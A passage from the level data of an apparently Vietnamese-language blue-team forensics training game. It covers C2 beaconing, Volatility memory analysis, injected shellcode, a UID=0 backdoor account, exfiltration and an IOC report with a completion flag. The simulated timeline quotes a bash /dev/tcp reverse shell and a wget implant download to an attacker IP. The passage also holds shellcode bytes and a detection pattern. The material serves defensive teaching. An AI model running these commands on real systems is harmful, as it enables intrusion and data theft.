      { term: 'Beaconing', def: 'Hành vi malware kết nối định kỳ về C2 để nhận lệnh; pattern đều đặn (mỗi N phút) là dấu hiệu nhận biết rõ nhất.' },
      { term: 'TCP handshake (SYN/SYN-ACK/ACK)', def: 'Ba bước thiết lập kết nối TCP; trong pcap thấy SYN từ victim tới C2 là reverse shell hoặc beacon bắt đầu.' },
    ],
    debrief: [
      'Beacon đều 5 phút (01:45, 01:50, 01:55, 02:00) là dấu hiệu rõ ràng của C2 — traffic người dùng thật không bao giờ đều như vậy.',
      'Kết nối ban đầu TCP tới port 4444 (reverse shell), sau đó beacon HTTP tới port 8080 — attacker dùng port cao thay port chuẩn để né giám sát.',
      'DEFENDER: network IDS (Suricata/Snort) detect beacon pattern; egress filtering chặn outbound tới port không chuẩn; NDR (Network Detection & Response) phát hiện C2 bằng ML.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/capture.pcap': { type: 'file', content: '[Binary pcap — use tcpdump -nr to read]' },
      '/home/hacker/network.log': {
        type: 'file',
        content: [
          '2026-06-25 01:43:31 CONN src=10.0.0.12:45123 dst=192.168.1.105:4444 proto=TCP state=ESTABLISHED',
          '2026-06-25 01:45:00 HTTP src=10.0.0.12 dst=192.168.1.105:8080 method=GET path=/beacon bytes=128',
          '2026-06-25 01:50:00 HTTP src=10.0.0.12 dst=192.168.1.105:8080 method=GET path=/beacon bytes=128',
          '2026-06-25 01:55:00 HTTP src=10.0.0.12 dst=192.168.1.105:8080 method=GET path=/beacon bytes=128',
          '2026-06-25 02:00:00 HTTP src=10.0.0.12 dst=192.168.1.105:8080 method=GET path=/beacon bytes=128',
          '2026-06-25 03:45:21 HTTP src=10.0.0.12 dst=192.168.1.105:8080 method=POST path=/exfil bytes=10485760',
        ].join('\n'),
      },
    },
  },

  // ── 11 ────────────────────────────────────────────────────────────────────
  {
    id: 11,
    chapterId: 13,
    title: 'Tiến trình ẩn trong memory dump',
    story:
      'Memory dump của server đã được capture khi sự cố đang diễn ra. Volatility là framework phân tích memory forensics: liệt kê process từ RAM sẽ thấy cả những process cố ẩn khỏi ps thông thường bằng rootkit.',
    steps: [
      {
        id: 'vol_pslist',
        description: 'Chạy volatility pslist để liệt kê process từ memory dump',
        match: /^volatility\b.*pslist/i,
        output: [
          'Volatility Foundation Volatility Framework 2.6.1',
          'Offset(V)          Name                PID   PPID   Thds  Sess  Start',
          '------------------ -------------------- ----- ------ ----- ----- ----',
          '0xffff8800123a0000 systemd                  1      0     1    --  2026-06-25 00:00:01',
          '0xffff8800123b0000 sshd                  1024      1     1    --  2026-06-25 00:00:05',
          '0xffff8800123c0000 nginx                 2048      1     4    --  2026-06-25 00:00:07',
          '0xffff8800123d0000 php-fpm7.4            3072      1     2    --  2026-06-25 00:00:08',
          '0xffff8800123e0000 sshd                  9832   1024     1    --  2026-06-25 01:43:30',
          '0xffff8800123f0000 bash                  9834   9832     1    --  2026-06-25 01:43:31',
          '0xffff880012400000 wget                  9905   9834     1    --  2026-06-25 01:43:56',
          '0xffff880012410000 implant               9901   9834     3    --  2026-06-25 01:43:58',
        ].join('\n'),
      },
      {
        id: 'vol_pstree',
        description: 'Chạy pstree để thấy quan hệ cha-con giữa các process',
        match: /^volatility\b.*pstree/i,
        output: [
          'Volatility Foundation Volatility Framework 2.6.1',
          'Name                  PID   PPID',
          '...systemd              1     0',
          '......sshd           1024     1',
          '.........sshd        9832  1024',
          '............bash     9834  9832',
          '...............wget  9905  9834',
          '...............implant 9901 9834',
          '......nginx          2048     1',
        ].join('\n'),
      },
    ],
    hints: [
      'Volatility đọc memory dump và liệt kê process giống ps nhưng từ RAM — kể cả process ẩn. File dump ở /home/hacker/mem.raw.',
      'Liệt kê process: `volatility -f /home/hacker/mem.raw --profile=LinuxUbuntu pslist`.',
      'Xem quan hệ cha-con: `volatility -f /home/hacker/mem.raw --profile=LinuxUbuntu pstree` — thấy implant là con của bash, bash là con của sshd từ IP attacker.',
    ],
    terms: [
      { term: 'Volatility', def: 'Framework phân tích memory forensics mã nguồn mở; đọc RAM dump và trích xuất process, network connection, artifact.' },
      { term: 'Memory dump', def: 'Bản sao toàn bộ RAM tại một thời điểm; chứa process, key mã hoá, credential trong plaintext mà disk không có.' },
      { term: 'pslist', def: 'Plugin Volatility liệt kê process từ cấu trúc dữ liệu kernel; bắt được process mà rootkit unlink khỏi user-space danh sách.' },
      { term: 'PPID (Parent PID)', def: 'PID của process cha; pstree dùng PPID để vẽ cây quan hệ — phát hiện process con bất thường của sshd/bash.' },
    ],
    debrief: [
      'pslist từ memory thấy "implant" chạy dưới PID 9901 — process này không xuất hiện trong ps aux thông thường vì rootkit đã unlink khỏi danh sách process user-space.',
      'pstree phân tích PPID lộ chuỗi: sshd(9832) → bash(9834) → implant(9901) — đây là chuỗi tấn công rõ ràng: SSH login → bash shell → launch malware.',
      'DEFENDER: memory forensics là vũ khí của defender khi attacker dùng fileless malware; capture RAM sớm nhất có thể trước khi shutdown; EDR với memory scanning phát hiện process ẩn live.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/mem.raw': { type: 'file', content: '[Binary memory dump — use volatility to analyze]' },
    },
  },

  // ── 12 ────────────────────────────────────────────────────────────────────
  {
    id: 12,
    chapterId: 13,
    title: 'Mã độc inject vào process',
    story:
      'Ngoài implant riêng, kẻ tấn công còn inject shellcode vào nginx để ẩn sâu hơn. malfind là plugin Volatility phát hiện vùng nhớ có quyền execute bất thường — dấu hiệu của process injection. Đây là kỹ thuật advanced mà antivirus truyền thống bỏ qua.',
    steps: [
      {
        id: 'vol_malfind',
        description: 'Chạy volatility malfind để tìm vùng nhớ executable bất thường (process injection)',
        match: /^volatility\b.*malfind/i,
        output: [
          'Volatility Foundation Volatility Framework 2.6.1',
          '',
          'Process: nginx PID: 2048',
          'Address: 0x7f1234000000  Size: 4096',
          'Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE',
          '0x00000000  4d 5a 90 00 03 00 00 00  MZ......',
          '0x00000008  04 00 00 00 ff ff 00 00  ........',
          '',
          'Process: nginx PID: 2048',
          'Address: 0x7f1235000000  Size: 8192',
          'Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE',
          '0x00000000  48 31 c0 48 89 c7 b8 3b  H1.H...;',
          '0x00000008  00 00 00 0f 05 00 00 00  ........',
        ].join('\n'),
      },
      {
        id: 'cat_malfind_notes',
        description: 'Đọc ghi chú phân tích để hiểu shellcode đã inject vào nginx làm gì',
        match: /^cat\b.*malfind_notes\.txt/i,
      },
    ],
    hints: [
      'malfind tìm vùng RAM vừa có quyền ghi vừa có quyền thực thi — pattern điển hình của shellcode inject vào process hợp lệ.',
      'Chạy: `volatility -f /home/hacker/mem.raw --profile=LinuxUbuntu malfind`. Chú ý process nào bị inject và địa chỉ vùng nhớ.',
      'Đọc ghi chú phân tích: `cat /home/hacker/malfind_notes.txt` — giải thích shellcode đã inject vào nginx làm gì và tại sao nguy hiểm.',
    ],
    terms: [
      { term: 'malfind', def: 'Plugin Volatility tìm vùng nhớ PAGE_EXECUTE_READWRITE bất thường — thường là dấu hiệu shellcode hoặc reflective injection.' },
      { term: 'Process injection', def: 'Chèn code vào process hợp lệ (nginx, svchost) để chạy malware ẩn dưới danh nghĩa process đó.' },
      { term: 'PAGE_EXECUTE_READWRITE', def: 'Vùng nhớ có cả quyền ghi lẫn quyền thực thi; cờ đỏ của forensics vì code bình thường không cần cả hai đồng thời.' },
      { term: 'Shellcode', def: 'Đoạn mã máy nhỏ thực thi trực tiếp; inject vào vùng nhớ executable của process khác để chạy mà không cần file riêng.' },
    ],
    debrief: [
      'MZ header (4d 5a) trong vùng nhớ của nginx là dấu hiệu một PE/ELF được nạp vào process — reflective injection; malware tự map mình vào RAM không qua disk.',
      'Inject vào nginx giúp malware ẩn sau HTTP traffic hợp lệ và tránh EDR theo dõi process standalone; từ nginx context nó có quyền đọc request/response.',
      'DEFENDER: EDR với memory scanning (CrowdStrike Falcon, SentinelOne) phát hiện PAGE_EXECUTE_READWRITE realtime; kernel-level hook monitor mprotect để bắt inject trước khi code chạy.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/mem.raw': { type: 'file', content: '[Binary memory dump — use volatility to analyze]' },
      '/home/hacker/malfind_notes.txt': {
        type: 'file',
        content: [
          'malfind Analysis Notes — 2026-06-25',
          '',
          'Finding 1: nginx PID 2048, Address 0x7f1234000000',
          '  - MZ header detected -> PE/ELF loader injected into nginx process memory',
          '  - Size: 4096 bytes -> small loader stage',
          '  - Likely: reflective injection to intercept nginx worker processing',
          '',
          'Finding 2: nginx PID 2048, Address 0x7f1235000000',
          '  - Bytes: 48 31 c0 = xor rax,rax; b8 3b 00 00 00 = mov eax,59 (syscall execve)',
          '  - syscall 59 = execve("/bin/sh") -> reverse shell payload',
          '  - This shellcode runs inside nginx worker, opening shell with nginx permissions',
          '',
          'Recommendation: nginx binary may be trojanized. Verify package integrity.',
        ].join('\n'),
      },
    },
  },

  // ── 13 ────────────────────────────────────────────────────────────────────
  {
    id: 13,
    chapterId: 13,
    title: 'Tài khoản backdoor được tạo',
    story:
      'Kẻ tấn công không chỉ dùng cron và SSH key — chúng còn tạo một tài khoản hệ thống giả với UID=0 (quyền root) ngụy trang là service account. Backdoor account này tồn tại ngay cả khi key và cron bị dọn sạch.',
    steps: [
      {
        id: 'grep_useradd',
        description: 'Grep auth.log để tìm sự kiện tạo tài khoản (useradd)',
        match: /^grep\b.*useradd.*auth\.log/i,
      },
      {
        id: 'cat_passwd',
        description: 'Đọc /etc/passwd để tìm tài khoản lạ với UID=0',
        match: /^cat\b.*\/etc\/passwd/i,
      },
    ],
    hints: [
      'useradd để lại dấu trong auth.log. Tìm sự kiện đó để biết khi nào và tài khoản nào bị tạo.',
      'Grep auth.log: `grep "useradd" /var/log/auth.log` — thấy tên user mới, UID và thời điểm tạo.',
      'Xác nhận trong /etc/passwd: `cat /etc/passwd` — tìm user nào có UID=0 ngoài root, đó là backdoor account.',
    ],
    terms: [
      { term: 'useradd', def: 'Lệnh tạo user Linux; để lại sự kiện trong auth.log với thông tin user mới (UID, GID, home, shell).' },
      { term: 'UID=0', def: 'User ID 0 là root; account ngoài root mà có UID=0 là backdoor account với toàn quyền hệ thống.' },
      { term: '/etc/passwd', def: 'File chứa thông tin tài khoản Linux: username:x:UID:GID:comment:home:shell — mọi user đều có entry ở đây.' },
      { term: 'Privilege persistence', def: 'Duy trì quyền root ngay cả khi malware bị xoá; backdoor account UID=0 là ví dụ điển hình.' },
    ],
    debrief: [
      'UID=0 trên tài khoản svc_monitor là cờ đỏ rõ ràng: không service nào hợp lệ cần UID=0 ngoài root; đây là backdoor account.',
      'Tên "svc_monitor" cố giả vờ là service account hệ thống — dễ bị bỏ qua trong audit thủ công nếu không so với baseline.',
      'DEFENDER: audit /etc/passwd định kỳ cho UID=0; FIM on /etc/passwd và /etc/shadow; alert ngay khi useradd được chạy; kiểm tra sau incident xem có account lạ nào còn sót.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/auth.log': { type: 'file', content: AUTH_LOG },
      '/etc': { type: 'dir' },
      '/etc/passwd': {
        type: 'file',
        content: [
          'root:x:0:0:root:/root:/bin/bash',
          'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
          'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
          'sshd:x:74:74:Privilege-separated SSH:/run/sshd:/usr/sbin/nologin',
          'svc_monitor:x:0:0:System Monitor Service:/root:/bin/bash',
        ].join('\n'),
      },
    },
  },

  // ── 14 ────────────────────────────────────────────────────────────────────
  {
    id: 14,
    chapterId: 13,
    title: 'Phát hiện exfiltration dữ liệu',
    story:
      'Pcap đã thấy một POST request 10MB. Giờ mày cần xác nhận trong access log: endpoint nào bị dùng, kích thước bao nhiêu, và thời điểm ra sao. Exfil là bước cuối của chuỗi tấn công — dữ liệu đã ra ngoài không thể lấy lại.',
    steps: [
      {
        id: 'grep_post',
        description: 'Grep lọc tất cả HTTP POST request trong access.log',
        match: /^grep\b.*POST.*access\.log/i,
      },
      {
        id: 'grep_upload',
        description: 'Grep lọc request tới /upload để xác nhận endpoint exfiltration',
        match: /^grep\b.*upload.*access\.log/i,
      },
    ],
    hints: [
      'Exfiltration qua web thường là HTTP POST request với payload lớn. Tìm trong access.log.',
      'Lọc POST request: `grep "POST" /var/log/nginx/access.log` — chú ý request nào có byte count cao bất thường.',
      'Xác nhận endpoint: `grep "upload" /var/log/nginx/access.log` — thấy POST 10MB tới /upload lúc 03:45 là bằng chứng exfiltration.',
    ],
    terms: [
      { term: 'Exfiltration', def: 'Hành vi đánh cắp dữ liệu ra khỏi mạng nạn nhân; bước cuối trong kill chain; dữ liệu đã lọt ra không thể thu hồi.' },
      { term: 'HTTP POST exfil', def: 'Gửi dữ liệu đánh cắp qua HTTP POST — ẩn trong traffic web thông thường; thường dùng HTTPS để né DLP.' },
      { term: 'Data Loss Prevention (DLP)', def: 'Hệ thống phát hiện và ngăn dữ liệu nhạy cảm rời mạng; dựa trên content inspection hoặc byte threshold.' },
      { term: 'Byte count (access log)', def: 'Trường ghi số byte response trong access log nginx; giá trị cao bất thường (10MB+) là dấu hiệu exfil.' },
    ],
    debrief: [
      '10485760 bytes = 10MB trong một POST lúc 03:45 sáng từ IP tấn công — exfiltration rõ ràng, không phải traffic bình thường.',
      'Attacker chọn giờ thấp điểm (3-4 sáng) để exfil: ít người nhìn dashboard, bandwidth không bị cạnh tranh, anomaly detection ít nhạy hơn.',
      'DEFENDER: DLP phát hiện upload lớn bất thường; egress firewall giới hạn kích thước request; alert khi single POST vượt ngưỡng (vd 5MB) từ IP không phải CDN thật.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/var': { type: 'dir' },
      '/var/log': { type: 'dir' },
      '/var/log/nginx': { type: 'dir' },
      '/var/log/nginx/access.log': { type: 'file', content: NGINX_ACCESS_LOG },
    },
  },

  // ── 15 ────────────────────────────────────────────────────────────────────
  {
    id: 15,
    chapterId: 13,
    title: 'Dựng kết luận — IOC & Root Cause',
    story:
      'Điều tra xong. Giờ mày đọc file timeline tổng hợp và danh sách IOC để nộp báo cáo. Root cause analysis không chỉ là "chuyện gì xảy ra" mà còn "tại sao và lần tới phòng thế nào". Đây là sản phẩm cuối của Blue Team.',
    steps: [
      {
        id: 'cat_timeline',
        description: 'Đọc timeline.txt để xem chuỗi sự kiện từ đầu tới cuối vụ breach',
        match: /^cat\b.*timeline\.txt/i,
      },
      {
        id: 'cat_ioc',
        description: 'Đọc ioc.txt để lấy danh sách indicator cần block và hunt trên toàn hạ tầng',
        match: /^cat\b.*ioc\.txt/i,
      },
    ],
    hints: [
      'Sau điều tra, cần dựng timeline và danh sách IOC. Cả hai file đã được tổng hợp trong /home/hacker/.',
      'Đọc timeline: `cat /home/hacker/timeline.txt` — toàn bộ chuỗi sự kiện từ đầu tới cuối.',
      'Đọc IOC: `cat /home/hacker/ioc.txt` — danh sách IP, hash, file độc và flag kết thúc chương.',
    ],
    terms: [
      { term: 'Root Cause Analysis (RCA)', def: 'Phân tích nguyên nhân gốc rễ: không chỉ "bị hack" mà "cấu hình nào sai, quy trình nào thiếu" để khắc phục tận gốc.' },
      { term: 'IOC (Indicator of Compromise)', def: 'Tập hợp các dấu hiệu kỹ thuật (IP, hash, domain, YARA rule) dùng để block và hunt trên toàn hạ tầng.' },
      { term: 'Remediation', def: 'Khắc phục sự cố: block IOC, xoá persistence, patch lỗ hổng, reset credential, hardening cấu hình.' },
      { term: 'Lessons learned', def: 'Bài học rút ra để cải thiện phòng thủ: quy trình nào thất bại, phát hiện muộn ở bước nào, cần bổ sung giám sát gì.' },
    ],
    debrief: [
      'Vụ breach này có 5 điểm thất bại: (1) WordPress cho upload PHP; (2) www-data có mật khẩu SSH yếu; (3) /tmp không có noexec; (4) không có egress filtering; (5) không có FIM trên cron.d và authorized_keys.',
      'Mỗi bước tấn công có ít nhất một chốt chặn lẽ ra phải có: WAF chặn webshell upload; fail2ban chặn brute-force; EDR phát hiện implant; DLP chặn exfil.',
      'DEFENDER: defense-in-depth — không có silver bullet. Mục tiêu là tăng cost cho attacker đến mức chúng bỏ sang mục tiêu dễ hơn.',
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/timeline.txt': {
        type: 'file',
        content: [
          'INCIDENT TIMELINE — prod-web-01 (2026-06-25)',
          '================================================',
          '01:41:03  Web recon: GET /wp-admin/post.php (404)',
          '01:41:55  Web shell upload: POST /wp-content/uploads/shell.php',
          '01:42:10  RCE via web shell: cmd=whoami, cmd=cat /etc/passwd',
          '01:43:05  Reverse shell launched: bash -i >& /dev/tcp/192.168.1.105/4444',
          '01:43:12  SSH brute-force begins: 9 Failed password in 18s',
          '01:43:30  SSH login successful: www-data from 192.168.1.105',
          '01:43:56  Implant downloaded: wget http://192.168.1.105/implant -> /tmp/.x/implant',
          '01:43:58  Implant launched: PID 9901; process injection into nginx PID 2048',
          '01:45:00  C2 beacon begins: GET /beacon every 5 minutes to 192.168.1.105:8080',
          '03:12:47  Backdoor account created: svc_monitor (UID=0)',
          '03:12:50  SSH key backdoor added to /root/.ssh/authorized_keys',
          '03:13:00  Cron persistence: */5 * * * * root /tmp/.x/implant',
          '03:45:22  Data exfiltration: POST /upload 10MB to 192.168.1.105:8080',
          '',
          'Root cause: WordPress allowed PHP upload + weak www-data SSH password',
        ].join('\n'),
      },
      '/home/hacker/ioc.txt': {
        type: 'file',
        content: [
          'IOC REPORT — Digital Forensics Team — 2026-06-25',
          '=================================================',
          '',
          'IP ADDRESSES:',
          '  192.168.1.105  (attacker C2 and pivot host — block and investigate)',
          '',
          'FILE HASHES (SHA256):',
          '  a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1  implant',
          '',
          'PERSISTENCE ARTIFACTS TO REMOVE:',
          '  /etc/cron.d/apache-backup        (malicious cron)',
          '  /root/.ssh/authorized_keys line2  (attacker SSH key)',
          '  svc_monitor UID=0 in /etc/passwd  (backdoor account)',
          '  /wp-content/uploads/shell.php     (web shell)',
          '',
          'YARA RULE:',
          '  strings: { "GET /beacon HTTP/1.1" "/tmp/.x/" "192.168.1.105" }',
          '',
          'FLAG{blue_team_forensics_complete_ioc_documented}',
        ].join('\n'),
      },
    },
  },
];
